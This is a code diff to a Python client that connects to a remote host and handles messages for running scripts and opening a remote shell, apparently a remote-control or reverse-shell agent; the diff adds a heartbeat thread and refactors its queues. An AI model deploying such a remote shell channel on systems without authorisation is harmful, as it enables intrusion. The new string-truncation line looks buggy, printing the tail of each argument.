@@ -7,6 +7,7 @@ import subprocess
 import random
 import string
 import os
+from time import sleep
 
 
 class EnvKeys:
@@ -24,6 +25,7 @@ class Env:
 
 
 class Message:
+    PONG = 'PONG'
     REPLY = 'REPLY'
     RUN_SCRIPT = 'RUN_SCRIPT'
     OPEN_SHELL = 'OPEN_SHELL'
@@ -37,7 +39,7 @@ class Message:
         self.conversation_uid = conversation_uid if conversation_uid is not None else ''.join(random.choice(string.ascii_letters) for _ in range(16))
 
     def __str__(self):
-        return f'{self.conversation_uid}:{self.purpose}:{self.args}'
+        return f'{self.conversation_uid}:{self.purpose}:{[arg if len(arg) < 10 else f"{arg[10:]}..." for arg in self.args]}'
 
     @staticmethod
     def from_raw(line: bytes) -> 'Message':
@@ -54,20 +56,27 @@ class Communication:
 
     @staticmethod
     def initialise_communication(sock: socket.socket):
-        Thread(target=Communication._receive_messages_forever, args=(sock, Communication.messages_received), daemon=True).start()
-        Thread(target=Communication._send_messages_forever, args=(sock, Communication.messages_to_send), daemon=True).start()
+        Thread(target=Communication._receive_messages_forever, args=(sock,), daemon=True).start()
+        Thread(target=Communication._send_messages_forever, args=(sock,), daemon=True).start()
+        Thread(target=Communication._pong_forever, daemon=True).start()
 
     @staticmethod
-    def _receive_messages_forever(sock: socket.socket, message_received_queue: 'SimpleQueue[Message]'):
+    def _receive_messages_forever(sock: socket.socket):
         while True:
-            message_received_queue.put(Message.from_raw(Core.receive_line_from_sock(sock)))
+            Communication.messages_received.put(Message.from_raw(Core.receive_line_from_sock(sock)))
 
     @staticmethod
-    def _send_messages_forever(sock: socket.socket, message_to_send_queue: 'SimpleQueue[Message]'):
+    def _send_messages_forever(sock: socket.socket):
         header_parts = [Config.username.encode()]
         sock.send(b':'.join([b64encode(header_part) for header_part in header_parts]) + b'\n')
         while True:
-            sock.send(message_to_send_queue.get().to_raw() + b'\n')
+            sock.send(Communication.messages_to_send.get().to_raw() + b'\n')
+
+    @staticmethod
+    def _pong_forever():
+        while 1:
+            sleep(1)
+            Communication.messages_to_send.put(Message(Message.PONG))
 
 
 class Core:
@@ -132,6 +141,7 @@ class Config:
 
 def main():
     if Env.shell_conversation_uid is not None:
+        os.environ.pop(EnvKeys.SHELL_CONVERSATION_UID)
         header = b':'.join(b64encode(header_part.encode()) for header_part in ['', Message.OPEN_SHELL, Env.shell_conversation_uid])
         sock = socket.create_connection((Env.remote_ip, Env.remote_port))
         sock.send(header + b'\n')
